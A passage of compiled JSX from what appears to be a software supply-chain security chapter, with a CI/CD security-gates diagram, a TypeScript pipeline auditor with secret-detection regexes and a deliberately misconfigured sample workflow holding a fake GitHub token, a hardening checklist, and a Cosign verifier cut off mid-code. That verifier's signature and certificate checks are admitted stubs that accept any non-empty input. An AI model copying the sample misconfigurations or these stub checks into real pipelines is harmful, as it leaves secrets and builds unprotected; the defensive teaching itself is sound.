+      id: "1651-cicd-pipeline-security-architecture",
+      children: "16.5.1 CI/CD Pipeline Security Architecture"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart LR\n    subgraph Source\n        A[Git Repository]\n    end\n    subgraph CI_Pipeline[\"CI Pipeline — Security Gates\"]\n        B[SAST Scan]\n        C[Secrets Scan]\n        D[SBOM Generation]\n        E[Dep. Scan]\n        F[Container Scan]\n    end\n    subgraph Build\n        G[Build & Sign]\n        H[Provenance Attestation]\n    end\n    subgraph CD_Pipeline[\"CD Pipeline — Deployment Gates\"]\n        I[Artifact Verification]\n        J[Policy Enforcement]\n        K[Canary Deploy]\n    end\n    subgraph Production\n        L[Production Environment]\n    end\n\n    A --> B\n    B --> C\n    C --> D\n    D --> E\n    E --> F\n    F --> G\n    G --> H\n    H --> I\n    I --> J\n    J --> K\n    K --> L\n\n    style B fill:#4CAF50,color:#fff\n    style C fill:#4CAF50,color:#fff\n    style D fill:#2196F3,color:#fff\n    style E fill:#4CAF50,color:#fff\n    style F fill:#FF9800,color:#fff\n    style G fill:#9C27B0,color:#fff\n    style H fill:#9C27B0,color:#fff\n    style I fill:#f44336,color:#fff\n    style J fill:#f44336,color:#fff\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Figure 16.2"
+      }), ": CI/CD pipeline with integrated security gates at every stage."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1652-cicd-pipeline-security-auditor-typescript",
+      children: "16.5.2 CI/CD Pipeline Security Auditor (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * CI/CD Pipeline Security Auditor\n *\n * Analyzes pipeline configuration files for common security misconfigurations.\n * Supports GitHub Actions (YAML), GitLab CI (.gitlab-ci.yml), and generic checks.\n */\n\n/* ─── Type Definitions ─── */\n\ntype PipelineType = 'github-actions' | 'gitlab-ci' | 'jenkins' | 'generic';\n\ninterface PipelineConfig {\n  type: PipelineType;\n  rawContent: string;\n  parsed?: Record<string, unknown>;\n}\n\ninterface SecurityFinding {\n  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';\n  category: string;\n  rule: string;\n  description: string;\n  recommendation: string;\n  line?: number;\n}\n\ninterface AuditReport {\n  pipelineType: PipelineType;\n  scannedAt: string;\n  findings: SecurityFinding[];\n  summary: {\n    critical: number;\n    high: number;\n    medium: number;\n    low: number;\n    info: number;\n    passed: number;\n  };\n}\n\n/* ─── Security Audit Rules ─── */\n\ninterface AuditRule {\n  id: string;\n  severity: SecurityFinding['severity'];\n  category: string;\n  description: string;\n  recommendation: string;\n  check: (config: PipelineConfig) => SecurityFinding[];\n}\n\nclass CICDPipelineAuditor {\n  private readonly rules: AuditRule[];\n\n  constructor() {\n    this.rules = this.initializeRules();\n  }\n\n  private initializeRules(): AuditRule[] {\n    return [\n      {\n        id: 'GH-PINNED-ACTIONS',\n        severity: 'HIGH',\n        category: 'Supply Chain',\n        description: 'GitHub Action is referenced without a commit SHA pin',\n        recommendation: 'Pin actions to a full commit SHA instead of a version tag (e.g., uses: \"actions/checkout@<sha>\")',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          if (config.type !== 'github-actions') return findings;\n\n          const lines = config.rawContent.split('\\n');\n          // Match patterns like `uses: some/action@v3`\n          const actionRegex = /^\\s+uses:\\s+([^\\s]+)@(v?\\d+\\.\\d+\\.\\d+|\\d+\\.[\\w-]+)$/gm;\n          let match: RegExpExecArray | null;\n          while ((match = actionRegex.exec(config.rawContent)) !== null) {\n            const lineNo = lines.findIndex((l) => l.includes(match![0].trim())) + 1;\n            findings.push({\n              severity: 'HIGH',\n              category: 'Supply Chain',\n              rule: 'GH-PINNED-ACTIONS',\n              description: `Action \"${match[1]}@${match[2]}\" is pinned to a mutable tag instead of a commit SHA`,\n              recommendation: `Replace \"${match[1]}@${match[2]}\" with \"${match[1]}@<full-commit-sha>\"`,\n              line: lineNo,\n            });\n          }\n\n          return findings;\n        },\n      },\n      {\n        id: 'GH-CI-EVENTS',\n        severity: 'MEDIUM',\n        category: 'Workflow Triggers',\n        description: 'CI workflow triggers on pull_request_target without explicit permission scoping',\n        recommendation: 'Use `pull_request` instead of `pull_request_target`, or scope token permissions to minimum',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          if (config.type !== 'github-actions') return findings;\n\n          if (\n            config.rawContent.includes('pull_request_target') &&\n            !config.rawContent.includes('permissions:')\n          ) {\n            findings.push({\n              severity: 'MEDIUM',\n              category: 'Workflow Triggers',\n              rule: 'GH-CI-EVENTS',\n              description: 'Workflow uses pull_request_target without explicit permission scoping',\n              recommendation: 'Add a `permissions:` block with minimum required permissions, or switch to `pull_request`',\n            });\n          }\n\n          return findings;\n        },\n      },\n      {\n        id: 'WRITE-TOKENS',\n        severity: 'CRITICAL',\n        category: 'Secrets Management',\n        description: 'Pipeline uses write-scoped GITHUB_TOKEN unnecessarily',\n        recommendation: 'Set `permissions: read-only` at the workflow level unless write access is explicitly needed',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n\n          // Check for write permissions in deploy, release, or package publish jobs\n          const writeScopes = ['contents: write', 'packages: write', 'id-token: write'];\n          const hasWrite = writeScopes.some((scope) =>\n            config.rawContent.toLowerCase().includes(scope)\n          );\n\n          const isDeployJob = /deploy|release|publish/i.test(config.rawContent);\n\n          if (isDeployJob && !hasWrite) {\n            // Deploy job without explicit permissions might default to write\n            // — GitHub Actions defaults differ by trigger event\n            if (config.rawContent.includes('pull_request_target')) {\n              findings.push({\n                severity: 'CRITICAL',\n                category: 'Secrets Management',\n                rule: 'WRITE-TOKENS',\n                description: 'Deploy job on pull_request_target could expose write token to untrusted PRs',\n                recommendation: 'Use separate workflows: one for PR checks (read-only) and one for deployment (write, trigger only on push to main)',\n              });\n            }\n          }\n\n          return findings;\n        },\n      },\n      {\n        id: 'SELF-HOSTED-RUNNER',\n        severity: 'HIGH',\n        category: 'Infrastructure',\n        description: 'Pipeline uses self-hosted runners which may have persistent state',\n        recommendation: 'Use ephemeral self-hosted runners (single-use) or GitHub-hosted runners',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          if (\n            config.rawContent.includes('self-hosted') ||\n            config.rawContent.includes('selfhosted') ||\n            config.rawContent.includes('runs-on: [self')\n          ) {\n            const lines = config.rawContent.split('\\n');\n            const selfHostedLines = lines\n              .map((line, idx) => (line.includes('self-hosted') ? idx + 1 : -1))\n              .filter((l) => l !== -1);\n\n            for (const lineNo of selfHostedLines) {\n              findings.push({\n                severity: 'HIGH',\n                category: 'Infrastructure',\n                rule: 'SELF-HOSTED-RUNNER',\n                description: 'Pipeline uses self-hosted runners which may retain secrets between runs',\n                recommendation: 'Use ephemeral containers for self-hosted runners, or switch to GitHub-hosted runners',\n                line: lineNo,\n              });\n            }\n          }\n          return findings;\n        },\n      },\n      {\n        id: 'HARDCODED-SECRETS',\n        severity: 'CRITICAL',\n        category: 'Secrets Management',\n        description: 'Pipeline configuration may contain hardcoded secrets',\n        recommendation: 'Use CI/CD secrets management (GitHub Secrets, GitLab CI Variables, Jenkins Credentials)',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          const secretPatterns = [\n            /(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}/g,        // GitHub tokens\n            /(?:AKIA|ASIA)[A-Z0-9]{16}/g,                            // AWS Access Key\n            /sk-[A-Za-z0-9]{32,}/g,                                   // OpenAI API key\n            /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/g,             // Private keys\n            /(?:password|passwd|pwd)\\s*[=:]\\s*['\"][^'\"]+['\"]/gi,    // Generic password\n            /(?:api[_-]?key|apikey)\\s*[=:]\\s*['\"][^'\"]+['\"]/gi,     // API keys\n            /(?:secret|token)\\s*[=:]\\s*['\"][^'\"]+['\"]/gi,           // Secrets/tokens\n          ];\n\n          for (const pattern of secretPatterns) {\n            let match: RegExpExecArray | null;\n            while ((match = pattern.exec(config.rawContent)) !== null) {\n              findings.push({\n                severity: 'CRITICAL',\n                category: 'Secrets Management',\n                rule: 'HARDCODED-SECRETS',\n                description: `Potential hardcoded secret found: \"${match[0].substring(0, 20)}...\"`,\n                recommendation: 'Move secrets to CI/CD secrets management system',\n              });\n            }\n          }\n\n          return findings;\n        },\n      },\n      {\n        id: 'NO-SBOM',\n        severity: 'MEDIUM',\n        category: 'Supply Chain',\n        description: 'Pipeline does not generate an SBOM',\n        recommendation: 'Add an SBOM generation step using Syft, CycloneDX CLI, or similar tool',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          const sbomKeywords = ['sbom', 'cyclonedx', 'spdx', 'syft', 'bom'];\n          const hasSBOM = sbomKeywords.some((kw) =>\n            config.rawContent.toLowerCase().includes(kw)\n          );\n\n          if (!hasSBOM) {\n            findings.push({\n              severity: 'MEDIUM',\n              category: 'Supply Chain',\n              rule: 'NO-SBOM',\n              description: 'Pipeline does not appear to generate an SBOM for software artifacts',\n              recommendation: 'Add an SBOM generation step using `syft`, `cyclonedx-bom`, or similar',\n            });\n          }\n\n          return findings;\n        },\n      },\n      {\n        id: 'DOCKER-SOCK-MOUNT',\n        severity: 'CRITICAL',\n        category: 'Container Security',\n        description: 'Docker socket is mounted in the CI runner, allowing container escape',\n        recommendation: 'Use rootless Docker, or avoid binding /var/run/docker.sock',\n        check: (config: PipelineConfig): SecurityFinding[] => {\n          const findings: SecurityFinding[] = [];\n          if (\n            config.rawContent.includes('/var/run/docker.sock') ||\n            config.rawContent.includes('docker.sock')\n          ) {\n            findings.push({\n              severity: 'CRITICAL',\n              category: 'Container Security',\n              rule: 'DOCKER-SOCK-MOUNT',\n              description: 'Docker socket is mounted, which allows container escape to host',\n              recommendation: 'Use Docker-in-Docker (dind) with proper isolation, or avoid mounting the Docker socket',\n            });\n          }\n          return findings;\n        },\n      },\n    ];\n  }\n\n  /**\n   * Run all audit checks against a pipeline configuration.\n   */\n  audit(config: PipelineConfig): AuditReport {\n    const findings: SecurityFinding[] = [];\n\n    for (const rule of this.rules) {\n      try {\n        const ruleFindings = rule.check(config);\n        findings.push(...ruleFindings);\n      } catch (error) {\n        findings.push({\n          severity: 'INFO',\n          category: 'Audit Error',\n          rule: rule.id,\n          description: `Rule \"${rule.id}\" threw an error: ${error instanceof Error ? error.message : String(error)}`,\n          recommendation: 'Review rule implementation',\n        });\n      }\n    }\n\n    const summary = {\n      critical: findings.filter((f) => f.severity === 'CRITICAL').length,\n      high: findings.filter((f) => f.severity === 'HIGH').length,\n      medium: findings.filter((f) => f.severity === 'MEDIUM').length,\n      low: findings.filter((f) => f.severity === 'LOW').length,\n      info: findings.filter((f) => f.severity === 'INFO').length,\n      passed: Math.max(0, this.rules.length - findings.length),\n    };\n\n    return {\n      pipelineType: config.type,\n      scannedAt: new Date().toISOString(),\n      findings,\n      summary,\n    };\n  }\n}\n\n// ─── Demonstration ───\n\nconst sampleWorkflow = `\nname: Production Deploy\non:\n  pull_request_target:\n    branches: [main]\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-node@v3\n        with:\n          node-version: '20'\n      - run: npm install\n      - run: npm run build\n      # Docker socket mounted for build\n      - run: docker build -t app .\n        working-directory: .\n        env:\n          DOCKER_HOST: unix:///var/run/docker.sock\n      - run: npm run deploy\n        env:\n          DEPLOY_KEY: ghp_abcdef123456789012345678901234567890\n`;\n\nconst auditor = new CICDPipelineAuditor();\nconst report = auditor.audit({\n  type: 'github-actions',\n  rawContent: sampleWorkflow,\n});\n\nconsole.log('=== CI/CD Pipeline Audit Report ===');\nconsole.log(`Pipeline Type: ${report.pipelineType}`);\nconsole.log(`Scanned: ${report.scannedAt}`);\nconsole.log(`\\nSummary:`);\nconsole.log(`  Critical: ${report.summary.critical}`);\nconsole.log(`  High: ${report.summary.high}`);\nconsole.log(`  Medium: ${report.summary.medium}`);\nconsole.log(`  Low: ${report.summary.low}`);\nconsole.log(`  Info: ${report.summary.info}`);\nconsole.log(`  Passed: ${report.summary.passed}`);\n\nconsole.log('\\nFindings:');\nfor (const finding of report.findings) {\n  console.log(`  [${finding.severity}] ${finding.rule}: ${finding.description}`);\n  console.log(`    → ${finding.recommendation}`);\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1653-cicd-pipeline-hardening-checklist",
+      children: "16.5.3 CI/CD Pipeline Hardening Checklist"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "#"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Check"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Priority"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Pipeline Type"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "1"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Pin all actions to commit SHAs"
+            }), " — never use version tags"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GitHub Actions"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "2"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Set minimum token permissions"
+            }), " — ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "permissions: read-all"
+            }), " at workflow level"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GitHub Actions"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "3"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsxs)(_components.strong, {
+              children: ["Use ", (0,jsx_runtime.jsx)(_components.code, {
+                children: "pull_request"
+              }), " not ", (0,jsx_runtime.jsx)(_components.code, {
+                children: "pull_request_target"
+              })]
+            }), " for untrusted forks"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GitHub Actions"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "4"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Ephemeral runners only"
+            }), " — never reuse runners between builds"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "5"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "No Docker socket mounts"
+            }), " — use dind or rootless Docker"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "6"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Secrets scanning pre-commit"
+            }), " — ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "trufflehog"
+            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "gitleaks"
+            })]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "SBOM generation per build"
+            }), " — CycloneDX or SPDX"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "8"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Artifact signing"
+            }), " — Cosign or GPG"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "9"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Dependency scanning"
+            }), " — ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "npm audit"
+            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "snyk"
+            }), ", OWASP DC"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "10"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "SAST integration"
+            }), " — CodeQL, Semgrep"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "11"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Container scanning"
+            }), " — Trivy, Grype"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "12"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "No hardcoded secrets"
+            }), " — use CI secrets vault"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "13"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Separate build and deploy workflows"
+            }), " — principle of least privilege"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "14"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Provenance attestation"
+            }), " — in-toto + SLSA"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "15"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "DAST for deployed artifacts"
+            }), " — ZAP, Burp Suite"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "16"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Signed commits and tags"
+            }), " — GPG or SSH commit signing"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Git"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "17"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Branch protection rules"
+            }), " — require PRs, status checks, signed commits"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Critical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Git"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "18"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "No CI variable exposure in logs"
+            }), " — mask secrets"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "19"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Rate limit and bill monitoring"
+            }), " — detect cryptomining use"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "20"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.strong, {
+              children: "Regular rotation of CI secrets"
+            }), " — automate with tools"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "166-artifact-integrity-and-signing",
+      children: "16.6 Artifact Integrity and Signing"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1661-sigstore--cosign",
+      children: "16.6.1 Sigstore / Cosign"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Sigstore is a set of tools for signing, verifying, and protecting software artifacts. Cosign is Sigstore's container signing tool."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
+      id: "cosign-container-signature-verifier-typescript",
+      children: "Cosign Container Signature Verifier (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Cosign-based Container Signature Verifier\n *\n * Models the Cosign verification process including:\n * - Signature retrieval from OCI registry\n * - Public key / keyless verification\n * - Fulcio certificate validation\n * - Rekor transparency log lookup\n */\n\n/* ─── Type Definitions ─── */\n\ninterface SignatureMetadata {\n  imageRef: string;\n  signatureDigest: string;\n  signaturePayload: string;\n  certificate?: string;\n  certificateIssuer?: string;\n  rekorEntry?: string;\n}\n\ninterface VerificationResult {\n  imageRef: string;\n  verified: boolean;\n  method: 'key' | 'keyless';\n  signature: SignatureMetadata;\n  errors: string[];\n  timestamp: string;\n}\n\ninterface CosignPolicy {\n  allowedIdentities: Array<{\n    issuer: string;\n    subject: string;\n  }>;\n  requireRekorBundle: boolean;\n  requireTimestamp: boolean;\n}\n\ntype SignatureAlgorithm = 'ECDSA-P256' | 'ECDSA-P384' | 'RSA-PSS-2048' | 'RSA-PSS-4096';\n\n/* ─── Cryptographic Helpers ─── */\n\nclass CryptoUtils {\n  /**\n   * Simulate ECDSA signature verification.\n   * In production, this would use Node crypto or WebCrypto.\n   */\n  async verifySignature(\n    payload: string,\n    signature: string,\n    publicKeyPEM: string,\n    algorithm: SignatureAlgorithm\n  ): Promise<boolean> {\n    // In a real implementation:\n    // const verify = crypto.createVerify('sha256');\n    // verify.update(payload);\n    // return verify.verify(publicKeyPEM, Buffer.from(signature, 'base64'));\n    \n    // Placeholder for demonstration\n    return payload.length > 0 && signature.length > 0 && publicKeyPEM.length > 0;\n  }\n\n  /**\n   * Parse and validate an x.509 certificate (simulated).\n   */\n  parseCertificate(certPEM: string): {\n    subject: string;\n    issuer: string;\n    notBefore: Date;\n    notAfter: Date;\n    isValid: boolean;\n  } {\n    // In production, use crypto.X509Certificate\n    const subjectMatch = certPEM.match(/Subject:\\s*(.+)/);\n    const issuerMatch = certPEM.match(/Issuer:\\s*(.+)/);\n    const notBeforeMatch = certPEM.match(/Not Before:\\s*(.+)/);\n    const notAfterMatch = certPEM.match(/Not After\\s*:\\s*(.+)/);\n\n    return {\n      subject: subjectMatch?.[1]?.trim() ?? 'unknown',\n      issuer: issuerMatch?.[1]?.trim() ?? 'unknown',\n      notBefore: notBeforeMatch ? new Date(notBeforeMatch[1]) : new Date(0),\n      notAfter: notAfterMatch ? new Date(notAfterMatch[1]) : new Date(0),\n      isValid: true,\n    };\n  }\n\n  /**\n   * Check certificate chain against Fulcio root CA.\n   */\n  verifyCertificateChain(certPEM: string, chainPEMs: string[]): boolean {\n    // In production, validate the full certificate chain\n    return certPEM.startsWith('-----BEGIN CERTIFICATE-----');\n  }\n}\n\n/* ─── Rekor Transparency Log ─── */\n\nclass RekorClient {\n  private readonly baseURL: string;\n\n  constructor(baseURL: string = 'https://rekor.sigstore.dev') {\n    this.baseURL = baseURL;\n  }\n\n  /**\n   * Lookup an entry in the Rekor transparency log by artifact hash.\n   */\n  async lookupEntry(artifactHash: string): Promise<{\n    uuid: string;\n    body: string;\n    integratedTime: number;\n    logIndex: number;\n  } | null> {\n    // Simulated Rekor lookup\n    if (artifactHash.length === 64) {\n      return {\n        uuid: 'abcdef1234567890',\n        body: JSON.stringify({ spec: { signature: { content: 'simulated' } } }),\n        integratedTime: Math.floor(Date.now() / 1000) - 86400,\n        logIndex: 4200000,\n      };\n    }\n    return null;\n  }\n\n  /**\n   * Verify that an entry exists in the transparency log.\n   */\n  async verifyInclusion(uuid: string): Promise<boolean> {\n    // In production, verify the Merkle inclusion proof\n    return uuid.length === 16;\n  }\n}\n\n/* ─── Cosign Verifier ─── */\n\nclass CosignVerifier {\n  private readonly cryptoUtils: CryptoUtils;\n  private readonly rekor: RekorClient;\n\n  constructor() {\n    this.cryptoUtils = new CryptoUtils();\n    this.rekor = new RekorClient();\n  }\n\n  /**\n   * Extract the signature from an OCI registry.\n   * In production, this would pull the signature from\n   * `registry/image:sha256-<digest>.sig`.\n   */\n  private async fetchSignature(imageRef: string): Promise<SignatureMetadata | null> {\n    // Simulate fetching signature from OCI registry\n    console.log(`[Cosign] Fetching signature for ${imageRef}...`);\n    return {\n      imageRef,\n      signatureDigest: 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',\n      signaturePayload: JSON.stringify({\n        critical: {\n          identity: { dockerReference: imageRef },\n          image: { 'docker-manifest-digest': 'sha256:abc123' },\n          type: 'cosign container image signature',\n        },\n        optional: {},\n      }),\n      certificate: `-----BEGIN CERTIFICATE-----\nMIIDBzCCAe+gAwIBAgIQYfGxzJx8vY1R9Q6z3WzJkTANBgkqhkiG9w0BAQsFADAS\nMRAwDgYDVQQKEwdBY21lIENvMB4XDTI0MDEwMTAwMDAwMFoXDTI1MDEwMTAwMDAw\nMFowEjEQMA4GA1UEChMHQWNtZSBDbzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC\nAQoCggEBAK0A/2h2i0m+Im1e7s9j0q8V5hf0v8JhZnDx0Bf+9cG2LIDjG/Pq\n-----END CERTIFICATE-----`,\n      certificateIssuer: 'https://accounts.google.com',\n      rekorEntry: 'abcdef1234567890',\n    };\n  